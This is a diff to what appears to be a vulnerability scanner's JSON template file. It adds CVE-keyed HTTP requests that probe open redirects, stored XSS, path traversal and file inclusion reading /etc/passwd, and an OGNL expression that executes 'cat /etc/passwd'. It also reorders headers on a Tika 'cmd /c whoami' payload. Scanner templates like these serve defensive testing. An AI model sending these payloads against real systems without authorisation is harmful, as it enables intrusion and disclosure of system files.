@@ -4553,6 +4553,21 @@
       ]
     },
     {
+      "id": "CVE-2016-3978",
+      "info": {
+        "name": "FortiOS (Fortinet) - Open Redirect and XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/login?redir=http://www.example.com"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2016-4975",
       "info": {
         "name": "Apache mod_userdir CRLF injection",
@@ -6006,11 +6021,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Content-type": "image/jp2",
+            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
-            "Content-type": "image/jp2",
-            "Connection": "close"
+            "Expect": "100-continue"
           },
           "method": "PUT",
           "path": [
@@ -7501,6 +7516,21 @@
         {
           "raw": [
             "POST /NateMail.php HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\nrecipient=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-13396",
+      "info": {
+        "name": "FlightPath Local File Inclusion",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /login HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /flightpath/index.php?q=system-handle-form-submit HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json, text/plain, */*\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\ncallback=system_login_form&form_token={{token}}&form_include=../../../../../../../../../etc/passwd\n"
           ]
         }
       ]
@@ -9693,6 +9723,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/?id=%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28%23arglist%3D%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22cat+%2Fetc%2Fpasswd%22%29%29.%28%23execute%3D%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7D"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-18268",
+      "info": {
+        "name": "Z-BlogPHP 1.5.2 Open redirect",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /zb_system/cmd.php?act=verify HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 81\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\nbtnPost=Log+In&username={{username}}&password={{md5(\"{{password}}\")}}&savedate=0\n",
+            "GET /zb_system/cmd.php?atc=login&redirect=http://www.example.com HTTP/2\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -12645,6 +12690,21 @@
       ]
     },
     {
+      "id": "CVE-2021-25864",
+      "info": {
+        "name": "Hue Magic - Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/hue/assets/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2fpasswd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-26084",
       "info": {
         "name": "Confluence Server OGNL injection - RCE",
@@ -14947,6 +15007,22 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/templates/m/inc_head.php?q=%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-46005",
+      "info": {
+        "name": "Sourcecodester Car Rental Management System 1.0 - Stored XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /admin/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\nusername={{username}}&password={{password}}&login=\n",
+            "POST /admin/post-avehical.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarypWqYipqU21aYgccv\n\n------WebKitFormBoundarypWqYipqU21aYgccv\nContent-Disposition: form-data; name=\"vehicletitle\"\n\nTest\n------WebKitFormBoundarypWqYipqU21aYgccv\nContent-Disposition: form-data; name=\"brandname\"\n\n1\n------WebKitFormBoundarypWqYipqU21aYgccv\nContent-Disposition: form-data; name=\"vehicalorcview\"\n\n</script><script>alert(document.domain)</script>\n------WebKitFormBoundarypWqYipqU21aYgccv\nContent-Disposition: form-data; name=\"priceperday\"\n\n500\n------WebKitFormBoundarypWqYipqU21aYgccv\nContent-Disposition: form-data; name=\"fueltype\"\n\nPetrol\n------WebKitFormBoundarypWqYipqU21aYgccv\nContent-Disposition: form-data; name=\"modelyear\"\n\n2022\n------WebKitFormBoundarypWqYipqU21aYgccv\nContent-Disposition: form-data; name=\"seatingcapacity\"\n\n5\n------WebKitFormBoundarypWqYipqU21aYgccv\nContent-Disposition: form-data; name=\"img1\"; filename=\"test.png\"\nContent-Type: image/png\n\n\n------WebKitFormBoundarypWqYipqU21aYgccv\nContent-Disposition: form-data; name=\"img2\"; filename=\"test.png\"\nContent-Type: image/png\n\n\n------WebKitFormBoundarypWqYipqU21aYgccv\nContent-Disposition: form-data; name=\"img3\"; filename=\"test.png\"\nContent-Type: image/png\n\n\n------WebKitFormBoundarypWqYipqU21aYgccv\nContent-Disposition: form-data; name=\"img4\"; filename=\"test.png\"\nContent-Type: image/png\n\n\n------WebKitFormBoundarypWqYipqU21aYgccv\nContent-Disposition: form-data; name=\"img5\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundarypWqYipqU21aYgccv\nContent-Disposition: form-data; name=\"submit\"\n\n\n------WebKitFormBoundarypWqYipqU21aYgccv--\n",
+            "GET / HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
